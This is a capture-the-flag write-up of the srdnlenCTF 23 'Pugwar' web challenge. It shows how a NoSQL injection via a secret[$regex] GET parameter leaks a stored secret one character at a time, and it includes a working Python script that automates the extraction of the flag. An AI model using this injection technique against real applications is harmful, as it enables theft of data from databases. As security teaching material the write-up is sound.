+++
author = "Ivan Valentini & Alessandro Mizzaro"
title = "[SrdnlenCTF 23] Pugwar"
date = "2023-10-30"
description = "Writeup for the Pugwar challenge of the srdnlenCTF 23"
tags = [
    "writeup",
    "ctf",
    "web"
]
+++

## Challenge description

What do you call a cold pug? A pugsicle!

Website: [http://pugwar.challs.srdnlen.it](http://pugwar.challs.srdnlen.it)

Author: [@Octaviusss](https://github.com/Octaviusss)

---

This time we don't have source code. The `X-Powered-By` header returned by the server is equal to `Express` so most likely we are attacking a Node.js application.

The application offers the following functionality:
- Registration/Login
- Creating a pug with a name, ability and secret associated with your user (`/choose-fighters`)
- Edit the ability of a pug that you created (`/fighter-customization`)

In the Hall Of Fame page we see a pug called Mario with its ability. Apparently he knows how to keep secrets. So our objective is to learn what type of secret is the pug Mario knows!

After having created an pug a big blue button shows up in the homepage that redirects to `/choose-fighters?pugName=A_Name_You_Chose`. A page that allows you to change the ability of the pug you have just created.

We can't edit the ability of the pug we have not created, so if we go to the page `/choose-fighters?pugName=Mario` we get back a message saying `You can't customize other players fighter!`. 

Let's say that you have created a pug like this:

| Property | Value| 
| - | -| 
| Name| Luigi|
| Ability| Do nothing| 
| Secret| Hello | 

If you were to go to the page `/choose-fighters?pugName=Luigi` you would be able to change Luigi's ability, but interestingly if you went to the page `/choose-fighters?pugName=Luigi&secret=Hello` you would be presented with the same page!

But if you went to the page `/choose-fighters?pugName=Luigi&secret=Hell` the website would answer `There are no fighters with that pugName!` so even though the `pugName` is correct, the server answers that it can't find a pug with that name, so the backed is checking every parameter we provide.

Many times Node.js application use NoSQL databases because they are very easy to set up and work with. But these type of databases suffer from the similar vulnerabilities as SQL databases.

These types of vulnerabilities are [well documented](https://book.hacktricks.xyz/pentesting-web/nosql-injection) online and to check if also the challenge server is vulnerable is as simple as going to `/choose-fighters?pugName=Luigi&secret[$regex]=^Hell`. This will make the server compare with a regex the `secret` value we provided and the one stored in the database. Because the regex we provided matches if the secret starts with `Hell` and the correct secret is `Hello` the server now no longer returns a message saying that `There are no fighters with that pugName!` but instead it will give us the ability to edit the pug ability!

Let's see how we can adapt this finding to get the flag. 
We know that if we try to change the ability of the Mario pug we will get a message saying `You can't customize other players fighter!`, but if we try to go to the page `/choose-fighters?pugName=Mario&secret=Anything` we will get a different error message saying `There are no fighters with that pugName!`.

This opens up the ability for us to differentiate between a correct `secret` and a bad `secret`. And because we can put a regex in the `secret` GET parameter we can enumerate character by character the content of the `secret` field like this:

| Request | Response |
| - | -| 
| /choose-fighters?pugName=Mario&secret[$regex]=^a| There are no fighters with that pugName! |
| /choose-fighters?pugName=Mario&secret[$regex]=^b| There are no fighters with that pugName! |
| ... | ... |
| /choose-fighters?pugName=Mario&secret[$regex]=^s| You can't customize other players fighter! |
| /choose-fighters?pugName=Mario&secret[$regex]=^sa| There are no fighters with that pugName! |
| ... | ... |
| /choose-fighters?pugName=Mario&secret[$regex]=^sr | You can't customize other players fighter! |


## Exploitation

We can automate this process with the following python script:
```python
import requests
import string
import random

URL = "http://pugwar.challs.srdnlen.it"

known = "srdnlen{"

# Register (to get a valid cookie)
s = requests.Session()
creds = ''.join([random.choice(string.ascii_letters) for _ in range(5)])
j = {"username": creds,"password":creds}
s.post(URL+"/register-user", json=j)

# Extract flag
while "}" not in known:    
    for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_}":
        params = {
            "pugName":"Mario",
            "secret[$regex]": "^" + known + c
        }
        r = s.get(URL+"/fighter-customization", params=params)
        if "There are no fighters with that pugName!" not in r.text:
            known += c
            print(known)

print(known)
```

The flag is:
`srdnlen{pu6S_4nd_n0sql1_wh4t_3l2e}`